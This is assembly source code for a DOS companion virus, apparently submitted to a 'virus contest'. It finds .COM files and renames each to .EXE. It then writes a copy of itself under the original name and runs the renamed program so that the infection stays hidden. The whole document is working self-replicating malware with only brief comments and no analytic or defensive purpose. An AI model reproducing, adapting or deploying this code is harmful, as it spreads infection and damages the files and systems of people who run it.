

; the UNKNOWN program....by Nikademus  ..... For the GrEaT ViRuS CoNtEsT ...              
		
		
		.radix 16
     code       segment
		model  small
		assume cs:code, ds:code, es:code

		org 100h
begin:
vir_start:
		mov     si, offset exe_name   ;copy original victims name
		mov     di, offset command    ;to command area
		mov     cl, 12d
		rep     movsb
		mov     byte ptr [di], 0Dh    ;tack on a return
		mov     al, 12d
		sub     al, cl
		mov     CMD_LEN, al           ;move command length to correct
					      ;area
		mov     ah, 1Ah               ;set DTA
		lea     DX, [LAST+90H]
		int     21h
		mov     ah, 4Eh               ; find #1
small_loop:                                 
		lea     dx, [vict_ext]        ; *.com
		int     21h
		jc      bye                   ; out o' victims?

		mov     si, offset last + 90h + 30d  ; copy name
		mov     di, offset exe_name          ; where to put it
		mov     cl, 12d                      ; 12 bytes
		rep     movsb
		
		cld
		mov     di, offset exe_name   ; find the period
		mov     al, '.'
		mov     cl, 9d
		repne   scasb
		push    cx                    ; save this for padding

		mov     si, offset exe_ext    ; tack on exe extension
		mov     cl, 3
		rep     movsb
		
		pop     cx
		mov     si, 6Dh               ;pad with blanks
		rep     movsb                        
		
		mov     dx, offset last + 90h + 30d  ; change name
		mov     di, offset exe_name          ; to the new name
		mov     ah, 56h
		int     21h
		jc      next                         ; name exists (infected?)
		mov     dx, offset last + 90h + 30d  ; create new (old) name
		xor     cx, cx
		mov     ah, 3Ch
		int     21h

		mov     bx, ax
		mov     cl, (offset last - offset begin) ; how much to write
		mov     dx, offset begin                 ; write to file
		mov     ah, 40h
		int     21h

		mov     ah, 3eh               ; close 'em
		int     21h
next:           clc                           ; clear the carry flag
		mov     ah, 4Fh               ; (could be set)
		jmp     small_loop            ; next victim


bye:
	       mov    bx, offset Last         ; end of me
	       mov    cl,4
	       shr    bx,cl
	       mov    ah,4ah                  ; deallocate rest of memory
	       int    21h
		
	       mov    si, offset mycommand    ; run old program
	       int    2Eh                     ; (dir with original)
		
	       int    20h
exe_ext         db      "EXE"
Vict_ext        db      "*.com",0
exe_name        db      "dir         ",0              
Last:
mycommand:
CMD_LEN         DB       13d                  ; ThE HeAp....
command         db       12d dup (' '),0

code            ends
		end begin




